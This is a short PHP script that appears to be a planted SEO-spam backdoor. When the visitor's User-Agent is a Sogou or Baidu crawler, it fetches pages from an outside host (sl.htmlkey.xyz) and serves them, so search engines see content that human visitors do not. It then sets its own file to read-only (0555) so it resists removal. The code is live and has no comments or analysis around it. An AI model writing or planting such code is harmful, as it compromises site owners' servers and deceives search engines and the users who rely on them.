<?php
header('Content-Type:text/html;charset=gb2312');
$key= $_SERVER["HTTP_USER_AGENT"];
if(strpos($key,'Sogou')!== false||strpos($key,'baidu')!==false)
{
   $file = file_get_contents('http://sl.htmlkey.xyz/'); 
   echo $file;//
}
$url1 = $_SERVER['PHP_SELF'];  
$filename1 = @end(explode('/',$url1));  
function set_writeable($file_name)
{@chmod($file_name,0555);} 
set_writeable($filename1);
?>
